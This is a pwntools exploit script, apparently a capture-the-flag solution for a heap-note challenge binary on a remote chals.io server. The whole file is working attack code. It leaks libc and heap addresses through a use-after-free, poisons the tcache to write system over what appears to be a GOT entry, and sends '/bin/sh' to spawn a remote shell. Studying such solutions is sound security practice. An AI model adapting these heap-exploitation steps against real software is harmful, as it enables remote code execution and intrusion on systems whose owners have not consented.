#!/usr/bin/env python
from pwn import *

elf = context.binary = ELF('./book_patched', checksec = False)
libc = ELF('./libc-2.27.so', checksec = False)

# conn = elf.process()
host = '0.cloud.chals.io'
port = 29394

conn = remote(host, port)

def cmd(choice):
    conn.recvuntil(b">> ")
    conn.sendline(str(choice).encode())

def new(size):
    cmd(1)
    conn.recvline()
    conn.sendline(str(size).encode())

def free(index):
    cmd(3)
    conn.recvline()
    conn.sendline(str(index).encode())

def edit(index, content):
    cmd(2)
    conn.recvline()
    conn.sendline(str(index).encode())
    conn.recvline()
    conn.send(content)

def show(index):
    cmd(4)
    conn.recvline()
    conn.sendline(str(index).encode())
    conn.recvuntil(b'OUTPUT: ')


new(0x510)
new(0x90)
new(0x90)

free(0)
show(0)

libc_leak = u64(conn.recv(6).ljust(8, b'\x00'))
log.info("Libc leak: " + hex(libc_leak))

libc_base = libc_leak - 0x3ebca0

libc.address = libc_base
free_hook = libc.symbols['__free_hook']
malloc_hook = libc.symbols['__malloc_hook']
system = libc.symbols['system']

log.success("Libc base: " + hex(libc_base))
log.success("__malloc_hook@GLIBC: " + hex(malloc_hook))
log.success("__free_hook@GLIBC: " + hex(free_hook))
log.success("system@GLIBC: " + hex(system))


free(2)
free(1)
show(1)

heap_leak = u64(conn.recvline().strip(b'\n').ljust(8, b'\x00'))
log.info("Heap leak: " + hex(heap_leak))
heap_base = heap_leak - 0x820 
log.success("Heap base: " + hex(heap_base))

edit(1, p64(0x602060))

new(0x90)
new(0x90)

books = 0x6020e0

one_gadget = [0x4f2a5, 0x4f302, 0x10a2fc]

edit(4, p64(system))

conn.recvuntil(b'>> ')
conn.sendline(b'/bin/sh')

conn.interactive()
